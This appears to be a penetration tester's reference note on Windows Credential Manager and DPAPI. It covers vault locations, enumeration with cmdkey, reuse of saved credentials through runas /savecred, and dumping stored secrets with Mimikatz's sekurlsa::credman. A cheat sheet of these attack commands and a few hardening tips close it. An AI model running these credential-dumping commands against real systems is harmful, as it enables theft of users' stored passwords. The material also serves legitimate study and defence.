# 5. Credential Manager & DPAPI

## Overview

Windows Credential Manager allows users and applications to store credentials such as passwords and login tokens. These are stored securely using DPAPI encryption, either in local or roaming profile paths.

Credential Storage Locations:

```
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each Vault contains a Policy.vpol file which stores AES keys (AES-128 or AES-256), protected by the DPAPI master key. Newer systems might use Credential Guard to isolate and protect these secrets.

## Credential Types

|Type|Description|
|---|---|
|Web Credentials|Used by browsers like IE/Edge to store site login data.|
|Windows Credentials|Used to store local/domain creds for services like SMB, RDP, OneDrive.|

## Enumerating Credentials

### Using cmdkey

```cmd
cmdkey /list
```

This lists credentials stored in the current user context.

Example Output:

```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

### Using rundll32 to View GUI

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

### Exporting Vaults (via GUI)

Control Panel > User Accounts > Credential Manager > Backup Credentials > .crd file

## Exploitation

### Use Saved Credentials with RunAs

```cmd
runas /savecred /user:SRV01\mcharles cmd
```

This launches a new shell using saved credentials.

### Dumping with Mimikatz

```text
privilege::debug
sekurlsa::credman
```

Expected Output:

```
* Username : mcharles@domain.local
* Domain   : onedrive.live.com
* Password : hunter2
```

This dumps Credential Manager secrets stored in memory.

## Alternative Tools

- SharpDPAPI: Decrypt DPAPI blobs offline using recovered masterkeys.
    
- LaZagne: Cross-platform credential dumper.
    
- DonPAPI: Extracts vault credentials and DPAPI secrets automatically.
    

## Hardening Tips

- Enable Credential Guard.
    
- Disable “Remember my credentials” for RDP and mapped drives.
    
- Monitor Event ID 5379 (DPAPI operation).
    

## Related Notes

- [[🟠 18. SAM & LSA Attack✔️]]
        
- [[🟠 19. LSASS Attack✔️]]
        

## Quick Ref Cheat Sheet

```
cmdkey /list
runas /savecred /user:<domain\user> cmd
mimikatz > privilege::debug
mimikatz > sekurlsa::credman
SharpDPAPI <masterkey> <vaultblob>
```
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Credential_Manager #DPAPI